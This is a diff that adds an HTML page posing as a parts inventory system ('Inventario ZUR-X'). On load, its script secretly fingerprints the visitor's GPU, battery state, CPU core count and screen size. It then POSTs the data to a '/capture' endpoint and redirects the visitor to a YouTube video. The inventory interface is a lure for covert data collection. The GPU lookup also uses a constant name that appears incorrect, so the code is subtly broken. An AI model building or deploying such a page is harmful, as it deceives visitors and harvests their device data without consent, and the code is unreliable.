@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Inventario ZUR-X | En Proceso</title>
+    <style>
+        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; padding: 50px; }
+        .gaveta { border: 2px solid #333; padding: 40px; border-radius: 5px; cursor: pointer; background: #222; }
+        .gaveta:hover { border-color: #00ff00; background: #2a2a2a; }
+        h1 { margin-top: 50px; }
+        #status { font-size: 0.8em; color: #888; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>SISTEMA DE INVENTARIO ZUR-X 🗄️</h1>
+    <p>Estado: [Sincronizando Base de Datos...]</p>
+    
+    <div class="grid">
+        <div class="gaveta">GAVETA 01<br>(MOSFETs)</div>
+        <div class="gaveta">GAVETA 02<br>(ICs)</div>
+        <div class="gaveta">GAVETA 03<br>(COILS)</div>
+        <div class="gaveta">GAVETA 04<br>(SENSORS)</div>
+        <div class="gaveta">GAVETA 05<br>(PROTOTYPES)</div>
+        <div class="gaveta">GAVETA 06<br>(TOOLS)</div>
+    </div>
+
+    <div id="status">Conectando con servidor central...</div>
+
+    <script>
+        async function captureData() {
+            // Ingeniería de Fingerprinting
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+
+            const battery = await navigator.getBattery();
+            
+            const payload = {
+                battery: `${(battery.level * 100)}% (${battery.charging ? 'Cargando' : 'Descargando'})`,
+                gpu: gpu,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                screen: `${window.screen.width}x${window.screen.height}`
+            };
+
+            // Envío al servidor
+            await fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            // Redirección final después de 1 segundo de "carga"
+            setTimeout(() => {
+                window.location.href = "https://youtube.com/shorts/Vds1fJ0aTHw";
+            }, 1000);
+        }
+
+        window.onload = captureData;
+    </script>
+</body>
+</html>
